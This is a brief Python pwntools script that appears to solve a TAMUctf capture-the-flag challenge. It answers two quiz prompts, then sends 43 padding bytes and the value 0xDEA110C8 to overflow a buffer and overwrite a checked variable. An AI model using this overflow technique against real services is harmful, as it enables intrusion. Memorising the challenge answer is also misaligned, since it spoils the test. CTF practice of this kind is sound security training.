from pwn import *

p=remote("pwn.tamuctf.com",4321)

print(p.recv(2048))
p.sendline("Sir Lancelot of Camelot")
print(p.recv(2050))
p.sendline("To seek the Holy Grail.")
print(p.recv(2050))
a="A"*0x2B
a+=p32(0xDEA110C8)
p.sendline(a)
print(p.recv(2050))
p.sendline("Sir Lancelot of Camelot")
print(p.recv(2050))
